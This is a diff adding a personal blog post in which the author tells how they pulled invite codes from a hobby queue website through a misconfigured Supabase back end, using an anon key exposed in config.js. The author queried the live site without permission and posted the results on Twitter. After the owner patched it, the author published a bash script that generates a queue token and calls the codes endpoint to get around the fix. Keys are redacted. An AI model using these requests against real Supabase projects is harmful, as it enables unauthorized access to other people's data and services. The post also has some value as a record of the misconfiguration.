@@ -1,0 +1,56 @@
+---
+title: skipping queues to get codes for chatcut
+description: ...very easily with a misconfigured supabase
+date: 'Feb 12 2026'
+author: 'undefinedcode'
+---
+
+we start at me scrolling through twitter and i see someone vibecoded a website for queuing in to get chatcut codes. i navigate to the website and notice a suparbase url, and a user api key in the `config.js` file found when you view the source of `index.html`. i start to think about how i could use this information to skip the queue (out of curiosity). i decide to use the user api key and the supabase url and retrieve the chatcut codes without having to wait in line via curl `curl "https://<<>>.supabase.co/rest/v1/codes?select=*" -H "apikey: <<>>" -H "Authorization: Bearer <<>>"` (information is redacted)... success. i post the results under a post on twitter:
+![post1](/assets/twitter1.png)
+
+after my discovery, i decided to contact the owner of the website on twitter:
+![post2](/assets/twitter2.png)
+
+UNTIL... i found out that the owner of the website introduced the requirement of tokens and uuids (for a valid session) but i found out that can be easily bypassed with a small python script. first, we'll get into how i found out about this. remember when the owner of the website "fixed the issue"? yeah, i looked at the new swagger api documentation and went straight to trying to find a workaround for the new patch to the issue i found earlier. after some trial and error, i managed to get five codes but not all the available ones the website reported, but they changed in large intervals, still a great discovery. now that you know about this, here is the script i came up with:
+
+```
+PROJECT="<<>>.supabase.co"
+ANON_KEY="<<>>"
+
+# session id
+if command -v uuidgen >/dev/null 2>&1; then
+  SID="$(uuidgen)"
+else
+  SID="$(python -c 'import uuid;print(uuid.uuid4())')"
+fi
+
+# generate queue token
+TOKEN_JSON=$(curl -s -X POST "https://${PROJECT}/rest/v1/rpc/generate_queue_token" \
+  -H "apikey: ${ANON_KEY}" \
+  -H "Authorization: Bearer ${ANON_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"p_session_id\":\"${SID}\"}")
+
+# extract just the token value
+TOKEN=$(echo "$TOKEN_JSON" | tr -d '"')
+
+# sanity check
+echo "Token: $TOKEN"
+
+# fetch codes
+curl -s -X POST "https://${PROJECT}/rest/v1/rpc/get_codes_with_token" \
+  -H "apikey: ${ANON_KEY}" \
+  -H "Authorization: Bearer ${ANON_KEY}" \
+  -H "Content-Type: application/json" \
+  -d "{\"p_token\":\"${TOKEN}\"}"
+```
+
+timeline for this:
+
+- feb 12 2:30 PM found info in `config.js` and started experimenting with requests via curl.
+- feb 12 2:55 PM successfully retrieved chatcut codes without waiting in line and posted results on twitter.
+- feb 12 3:00 PM contacted the owner of the website on twitter.
+- feb 12 3:03-3:28 PM contacted the owner of the website about the issue.
+- feb 12 3:40-4:56 PM issue is now resolved.
+- feb 12 7:00 PM-??? a new issue is found.
+- feb ?? ?:?? ?? the website is now taken down.
